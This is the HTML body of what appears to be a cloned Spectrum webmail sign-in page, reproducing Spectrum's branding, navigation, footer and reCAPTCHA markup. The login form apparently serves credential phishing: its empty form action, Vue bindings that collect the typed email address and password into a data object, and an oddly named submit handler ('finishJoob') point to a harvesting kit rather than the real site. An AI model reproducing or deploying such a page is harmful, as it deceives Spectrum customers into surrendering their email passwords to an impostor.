<body>
  

    <div class="loader" style="display: none;">
        <div class="spinner">
            <svg class="text-primary" width="80px" height="80px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
                <circle class="path" fill="none" strokewidth="4" strokelinecap="round" stroke="#0073d1" cx="33" cy="33" r="30"></circle>
            </svg>
        </div>
    </div>
    <div id="header">
        <nav role="navigation">
            <div class="app-header">
      <button tabindex="0" access-tabindex="skip-to-content" access-next-tabindex="banner-menu-button" class="skip-to-content-link">
        Skip to Main Content
      </button>
    
      <div class="app-header-container">
        <div class="app-header-menu">
          <div class="app-global-side-nav">
            <button class="nav-button" aria-haspopup="true" aria-label="Navigation menu" access-tabindex="banner-menu-button" access-next-tabindex="banner-logo">
              <span class="md-icon hamburger-icon mat-icon material-icons" role="img" aria-hidden="true"></span>
              <span class="nav-menu-label" aria-hidden="true" id="menu-label">MENU</span>
            </button>
    
            <div class="navOverlay"></div>
    
            <div class="sidenav">
              <div class="interiorSideNav">
                <div class="close-button">
                  <button class="icon-button" aria-label="Close button for navigation menu" tabindex="0" access-tabindex="sidenav-close" access-next-tabindex="sidenav-menu">
                    <span class="close-icon mat-icon" role="img" aria-hidden="true"></span>
                  </button>
                </div>
    
    
                <div>
                  <div class="menu-container">
                    <ul class="menu-unstyled ui-menu ui-widget ui-widget-content" access-tabindex="sidenav-menu" access-next-tabindex="sidenav-signout-button" id="ui-id-1" role="menu" tabindex="0">
                      <li class="ui-menu-item">
                        <div id="ui-id-2" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
                          <a class="menu-link menu-link-primary" target="_self" href="https://www.spectrum.net/login/">
                            Manage Account
                          </a>
                        </div>
                      </li>
                      <li class="ui-menu-item">
                        <div id="ui-id-3" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
                        <a class="menu-link menu-link-primary" target="_self" href="https://www.spectrum.net/support/">
                          Get Support
                        </a>
                        </div>
                      </li>
                      <li class="ui-menu-item">
                        <div id="ui-id-4" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
                        <a class="menu-link menu-link-primary" target="_self" href="https://watch.spectrum.net">
                          Watch TV
                        </a>
                        </div>
                      </li>
                    </ul>
                  </div>
                                </div>
              </div>
            </div>
          </div>
        </div>
    
        <div class="app-header-utility">
          <div class="app-utility-nav">
            <a class="list-item support-link mat-button" target="_blank" href="https://www.spectrum.net/support/" aria-disabled="false" aria-label="Support (Opens in a new window)" tabindex="0" access-tabindex="banner-link-support" access-next-tabindex="banner-link-signout">
              <span class="no-border">Support</span>
            </a>
                    </div>
        </div>
    
        <div class="app-header-logo">
          <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
          <center>  <img alt="Spectrum logo" src="../assets/images/spectrum-logo.svg" width="133px" height="24px"></center>
          </a>
        </div>
      </div>
    
      <div class="app-header-local">
        <div class="app-local-nav">
        </div>
      </div>
    
    </div>
        </nav>
    </div>
    
    <div id="body">
    
    <div id="loginForm">
    
      <div class="error" v-if="isActive">
                The info you entered doesn't match our records. Please try again.
        </div>
            
        <div id="loginFormContainer">
    <center>
            <h1 id="headline">
                Sign In to Webmail
            </h1> </center>
            <div id="hohLink">
                <div id="dividerLine"></div>
                <div id="orText">or</div>
                <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
            </div>
            <form action="" method="post">
                <div id="emailAddressContainer">
                    <label for="emailAddress">Email Address</label>
                    <input type="text" id="emailAddress" name="emailAddress" v-model="formDataRes.email">
                </div>
    
                <div id="rememberEmailContainer">
                    <input type="checkbox" name="rememberEmail" id="rememberEmail">
                    <label for="rememberEmail">
                        Remember Email Address
                    </label>
                </div>
    
                <div id="emailPasswordContainer">
                    <label for="emailPassword">
                        Email Password
                    </label>
                    <input type="password" id="emailPassword" name="emailPassword" v-model="formDataRes.password" >
                </div>
                <div class="captchaBlock" style="margin-bottom:25px;display: none">
                    <div class="g-recaptcha" data-sitekey="6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" width="304" height="78" role="presentation" name="a-7b13yzl68snd" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx&amp;co=aHR0cHM6Ly93ZWJtYWlsLnNwZWN0cnVtLm5ldDo0NDM.&amp;hl=en&amp;v=lqsTZ5beIbCkK4uGEGv9JmUR&amp;size=normal&amp;cb=8qry97dxunk3"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
                </div>
                <input type="submit" name="submit" id="emailSubmit" value="Sign In" @click.prevent="finishJoob();">
            </form>
    
            <div id="forgotLinks">
                <a id="forgotEmail" href="https://self-care.portals.spectrum.net/username-recovery">Forgot Email Address?</a>
                <a id="forgotPassword" href="https://self-care.portals.spectrum.net/password-reset">Forgot Email Password?</a>
            </div>
        </div>
    
    </div>
    </div>
    
    
    <div id="footer" style="margin-top: 15%;">
        <nav role="navigation">
            <ul>
        <li>© 2022 Charter Communications. All rights reserved</li>
        <li>
            <a href="https://www.spectrumreach.com/" target="_blank" aria-label="Advertise with Us (Opens in new window)">Advertise with Us</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/your-privacy-rights" target="_blank" aria-label="Your Privacy Rights (Opens in new window)">Your Privacy Rights</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/website-privacy-policy.html" target="_blank" aria-label="Web Privacy Policy (Opens in new window)">Web Privacy Policy</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/california" target="_blank" aria-label="California Consumer Privacy Rights (Opens in new window)">California Consumer Privacy Rights</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank" aria-label="California Consumer Do Not Sell Or Share My Personal Information (Opens in new window)">California Consumer Do Not Sell Or Share My Personal Information</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank" aria-label="California Consumer Limit The Use Of My Sensitive Personal Information (Opens in new window)">California Consumer Limit The Use Of My Sensitive Personal Information</a>
        </li>
    
        <li>
            <a href="https://www.spectrum.com/policies/terms-of-service.html" target="_blank" aria-label="Spectrum Subscriber Policies (Opens in new window)">Spectrum Subscriber Policies</a>
        </li>
    
        <li>
            Time Warner Cable and the Time Warner Cable logo
            are trademarks of Time Warner Inc., used under license.
        </li>
    </ul>
        </nav>
    </div>
    
    
    
    <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes" name="c-7b13yzl68snd" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=lqsTZ5beIbCkK4uGEGv9JmUR&amp;k=6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx" style="width: 100%; height: 100%;"></iframe></div></div></body>
    